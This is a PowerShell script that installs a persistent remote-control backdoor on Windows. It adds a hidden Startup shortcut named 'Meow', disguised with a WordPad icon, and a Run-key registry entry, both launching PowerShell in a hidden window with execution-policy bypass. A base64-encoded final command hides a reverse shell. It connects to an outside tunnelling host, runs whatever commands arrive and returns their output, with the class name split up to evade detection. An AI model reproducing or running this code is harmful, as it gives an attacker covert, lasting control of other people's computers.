 
param(
    [string]$ScriptPath =(Resolve-Path -Path $MyInvocation.MyCommand.Path),
    [string]$IconLocation = "C:\Program Files\Windows NT\Accessories\wordpad.exe",
    [string]$HotKey = "CTRL+W",
    [string]$Description = "powershell",
    [int]$WindowStyle = 7,
    [switch]$Hidden = $true,
    [switch]$p,
    [string]$ScriptArgument = ""
)

# If -p parameter is present, create the shortcut
if ($p) {
    # Define the path for the shortcut in the Startup folder
    
	   $shortcutPath = "$([Environment]::GetFolderPath('Startup'))\Meow.lnk"
	   $registryPath = 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'
    Set-ItemProperty -Path $registryPath -Name Meow -Value $shortcutPath
    

    # Create a WScript Shell object
    $wshell = New-Object -ComObject Wscript.Shell

    # Create or modify the shortcut object
    $shortcut = $wshell.CreateShortcut($shortcutPath)

    # Set the icon location for the shortcut
    $shortcut.IconLocation = $IconLocation

    # Set the target path and arguments for the shortcut
    $shortcut.TargetPath = "powershell.exe"
    $shortcut.Arguments = "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File $ScriptPath "

    # Set the working directory for the shortcut
    $shortcut.WorkingDirectory = (Get-Item $ScriptPath).DirectoryName

    # Set a hotkey for the shortcut
    $shortcut.HotKey = $HotKey

    # Set a description for the shortcut
    $shortcut.Description = $Description

    # Set the window style for the shortcut
    $shortcut.WindowStyle = $WindowStyle

    # Save the shortcut
    $shortcut.Save()

    # Optionally set the 'Hidden' attribute
    if ($Hidden) {
        [System.IO.File]::SetAttributes($shortcutPath, [System.IO.FileAttributes]::Hidden)
    }
}
powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand CgBmAHUAbgBjAHQAaQBvAG4AIABTAHQAYQByAHQALQBQAGUAcgBzAGkAcwB0AGUAbgB0AEMAbwBtAG0AYQBuAGQAIAB7AAoAIAAgACAAIABwAGEAcgBhAG0AIAAoAAoAIAAgACAAIAAgACAAIAAgAFsAcwB0AHIAaQBuAGcAXQAkAFUAbgBpAHEAdQBlAEkAZABlAG4AdABpAGYAaQBlAHIALAAKACAAIAAgACAAIAAgACAAIABbAHMAdAByAGkAbgBnAF0AJABTAGUAcgB2AGUAcgBBAGQAZAByAGUAcwBzACwACgAgACAAIAAgACAAIAAgACAAWwBpAG4AdABdACQAUABvAHIAdABOAHUAbQBiAGUAcgAKACAAIAAgACAAKQAKACAAIAAgACAAdwBoAGkAbABlACAAKAAkAHQAcgB1AGUAKQAgAHsACgAgACAAIAAgACAAIAAgACAAJABtAHUAdABlAHgAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4AVABoAHIAZQBhAGQAaQBuAGcALgBNAHUAdABlAHgAKAAkAGYAYQBsAHMAZQAsACAAJABVAG4AaQBxAHUAZQBJAGQAZQBuAHQAaQBmAGkAZQByACkACgAgACAAIAAgACAAIAAgACAAaQBmACAAKAAkAG0AdQB0AGUAeAAuAFcAYQBpAHQATwBuAGUAKAAwACwAIAAkAGYAYQBsAHMAZQApACkAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAdAByAHkAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAGkAcwBSAHUAbgBuAGkAbgBnACAAPQAgAEcAZQB0AC0AUAByAG8AYwBlAHMAcwAgAC0ATgBhAG0AZQAgACIAcABvAHcAZQByAHMAaABlAGwAbAAiACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlACAAfAAgAFcAaABlAHIAZQAtAE8AYgBqAGUAYwB0ACAAewAgACQAXwAuAEMAbwBtAG0AYQBuAGQATABpAG4AZQAgAC0AbABpAGsAZQAgACIAKgAkAFUAbgBpAHEAdQBlAEkAZABlAG4AdABpAGYAaQBlAHIAKgAiACAAfQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAaQBmACAAKAAtAG4AbwB0ACAAJABpAHMAUgB1AG4AbgBpAG4AZwApACAAewAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAGMAbABpAGUAbgB0ACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwAnACcAdABlAG0ALgBOACcAJwBlAHQALgBTAG8AYwAnACcAawBlAHQAcwAuAFQAYwAnACcAcABDAGwAJwAnAGkAZQBuAHQAKAAkAFMAZQByAHYAZQByAEEAZABkAHIAZQBzAHMALAAgACQAUABvAHIAdABOAHUAbQBiAGUAcgApAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAB3AGgAaQBsAGUAIAAoACQAdAByAHUAZQApACAAewAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAYgB5AHQAZQBzACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABiAHkAdABlAFsAXQAgADYANQA1ADMANQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABpAGYAIAAoACQAaQAgAC0AbABlACAAMAApACAAewAgAGIAcgBlAGEAawAgAH0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAGQAYQB0AGEAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABpACkACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACkACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACcAUABTACAAJwAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACcAPgAgACcACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIABbAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAgADAALAAgACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGUAbABzAGUAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiAFMAYwByAGkAcAB0ACAAaQBzACAAYQBsAHIAZQBhAGQAeQAgAHIAdQBuAG4AaQBuAGcALgAiAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAB9AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGYAaQBuAGEAbABsAHkAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAG0AdQB0AGUAeAAuAFIAZQBsAGUAYQBzAGUATQB1AHQAZQB4ACgAKQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0ACgAgACAAIAAgACAAIAAgACAAfQAKACAAIAAgACAAIAAgACAAIABlAGwAcwBlACAAewAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiAEEAbgBvAHQAaABlAHIAIABpAG4AcwB0AGEAbgBjAGUAIABpAHMAIABhAGwAcgBlAGEAZAB5ACAAcgB1AG4AbgBpAG4AZwAuACIACgAgACAAIAAgACAAIAAgACAAfQAKACAAIAAgACAAIAAgACAAIABTAHQAYQByAHQALQBTAGwAZQBlAHAAIAAtAFMAZQBjAG8AbgBkAHMAIAAxADAACgAgACAAIAAgAH0ACgB9AAoAUwB0AGEAcgB0AC0AUABlAHIAcwBpAHMAdABlAG4AdABDAG8AbQBtAGEAbgBkACAALQBVAG4AaQBxAHUAZQBJAGQAZQBuAHQAaQBmAGkAZQByACAAIgBLAGUAcgBlAHMAIgAgAC0AUwBlAHIAdgBlAHIAQQBkAGQAcgBlAHMAcwAgACIAcgBlAHQAdQByAG4AcwAtAGcAbwB2AGUAcgBuAGkAbgBnAC4AZwBsAC4AYQB0AC4AcABsAHkALgBnAGcAIgAgAC0AUABvAHIAdABOAHUAbQBiAGUAcgAgADMAMwA5ADIANQAKAA==
